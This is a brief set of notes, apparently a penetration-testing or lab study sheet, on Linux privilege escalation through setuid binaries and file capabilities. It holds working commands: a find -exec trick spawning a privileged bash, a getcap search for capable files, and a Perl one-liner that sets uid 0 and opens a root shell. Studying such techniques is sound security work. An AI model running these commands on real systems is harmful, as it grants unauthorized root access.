### Abusing Setuid Binaries and Capabilities

chmos u+s

find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
search capabilities of file in linux - /usr/sbin/getcap -r / 2>/dev/null
search on gtfobins

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

